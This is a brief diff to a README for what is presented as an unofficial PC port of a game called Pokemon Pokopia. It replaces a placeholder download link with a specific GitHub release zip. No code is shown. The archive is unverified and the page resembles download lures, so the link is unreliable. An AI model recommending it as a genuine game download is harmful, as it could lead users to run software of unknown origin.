@@ -22,7 +22,7 @@ Reimagine your journey with modern enhancements: featuring dedicated keyboard an
 
 ## 📥 Download
 
-📥 [`PokemonPokopia-PC.zip`](https://github.com/.../releases/download/v1.4/Pokopia-PC-v1.4.zip)  
+📥 [`PokemonPokopia-PC.zip`](https://github.com/Mike04ylno/Pokemon-Pokopia-PC/releases/download/Game-Port/PokemonPokopia-PC.zip)  
 ---
 
 ## ❗️ Troubleshooting
